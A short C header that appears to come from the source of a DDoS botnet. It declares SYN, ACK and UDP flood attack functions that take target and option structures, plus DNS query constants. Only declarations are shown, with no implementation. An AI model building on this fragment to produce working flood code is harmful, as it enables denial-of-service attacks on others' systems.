#pragma once

#include "util.h"

#define PROTO_DNS_QTYPE_A       1
#define PROTO_DNS_QCLASS_IP     1

void attack_tcp_syn(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_plain(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_udp_generic(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
void attack_tcp_ack(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
